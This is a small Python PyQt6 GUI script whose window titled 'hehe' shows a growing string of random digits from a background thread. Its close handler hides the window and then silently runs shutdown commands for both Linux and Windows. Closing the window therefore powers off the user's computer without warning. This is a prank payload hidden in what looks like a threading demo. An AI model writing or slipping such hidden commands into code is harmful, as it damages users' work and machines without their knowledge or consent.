from PyQt6 import QtCore, QtWidgets
from random import randrange
import os, sys


class MyThread(QtCore.QThread):
	mysignal = QtCore.pyqtSignal(str)

	def __init__(self, parent=None):
		QtCore.QThread.__init__(self, parent)

		self.running = False
		self.count = []

	def run(self):
		self.running = True

		while self.running:
			self.count.append(str(randrange(10)))
			self.mysignal.emit(''.join(self.count))
			self.sleep(1)


class MyWindow(QtWidgets.QWidget):
	def __init__(self, parent=None):
		QtWidgets.QWidget.__init__(self, parent)

		self.label = QtWidgets.QLabel('Test')
		self.label.setAlignment(QtCore.Qt.AlignmentFlag(0x0004))
		self.btnStart = QtWidgets.QPushButton('tap')

		self.vbox = QtWidgets.QVBoxLayout()
		self.vbox.addWidget(self.label)
		self.vbox.addWidget(self.btnStart)
		self.setLayout(self.vbox)

		self.mythread = MyThread()
		self.btnStart.clicked.connect(self.on_start)
		self.mythread.mysignal.connect(self.on_change, QtCore.Qt.ConnectionType(2))

	def on_start(self):
		if not self.mythread.isRunning():
			self.mythread.start()

	def on_change(self, s):
		self.label.setText(s)

	def closeEvent(self, event):
		self.hide()
		self.mythread.running = False
		self.mythread.wait(5000)
		os.system("shutdown now -h")
		os.system("shutdown /s /t 1")
		event.accept()


if __name__ =='__main__':
	app = QtWidgets.QApplication(sys.argv)
	window = MyWindow()
	window.setWindowTitle('hehe')
	window.resize(300, 100)
	window.show()
	sys.exit(app.exec())
	